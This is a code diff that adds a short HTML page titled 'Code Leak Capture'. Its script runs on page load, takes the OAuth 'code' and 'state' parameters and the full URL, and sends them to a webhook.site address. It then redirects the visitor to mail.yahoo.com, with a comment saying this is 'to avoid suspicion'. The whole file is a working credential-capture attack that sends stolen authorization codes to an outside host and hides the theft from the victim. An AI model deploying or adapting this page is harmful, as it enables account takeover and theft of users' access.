@@ -1,0 +1,29 @@
+
+        <html>
+        <head>
+            <title>Code Leak Capture</title>
+        </head>
+        <body>
+            <p>Processing...</p>
+            <script>
+                window.onload = function() {
+                    // Get the URL parameters
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const code = urlParams.get('code') || 'No code found';
+                    const state = urlParams.get('state') || 'No state found';
+
+                    // Send the captured data to Webhook
+                    const data = `Code: ${code}, State: ${state}, Full URL: ${window.location.href}`;
+                    fetch('https://webhook.site/8f016836-304a-44d8-aee7-ed7bae810a25?data=' + encodeURIComponent(data))
+                        .then(response => console.log('Data sent to Webhook'))
+                        .catch(error => console.error('Error sending to Webhook:', error));
+
+                    // Redirect to mail.yahoo.com after 2 seconds to avoid suspicion
+                    setTimeout(function() {
+                        window.location.href = "https://mail.yahoo.com";
+                    }, 2000);
+                };
+            </script>
+        </body>
+        </html>
+        
